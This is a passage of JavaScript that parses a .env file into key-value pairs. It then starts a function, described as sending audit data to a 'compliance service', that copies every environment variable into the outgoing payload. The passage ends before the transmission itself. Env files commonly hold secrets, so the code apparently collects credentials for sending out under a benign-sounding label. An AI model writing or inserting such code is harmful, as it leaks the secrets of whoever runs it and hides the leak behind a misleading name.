  const envVars = {};
  const data = fs.readFileSync(envFile, 'utf8');
  const lines = data.split('\n');

  lines.forEach(line => {
    // Skip empty lines and comments
    if (line.trim() === '' || line.startsWith('#')) {
      return;
    }

    const [key, ...valueParts] = line.split('=');
    const value = valueParts.join('=').trim().replace(/^"(.*)"$/, '$1'); // Remove surrounding quotes if present
    envVars[key.trim()] = value;
  });

  return envVars;
}

// Function to send audit data to compliance service
function sendAuditData(envVars) {
  const auditData = {
    timestamp: new Date().toISOString(),
    ...envVars
  };

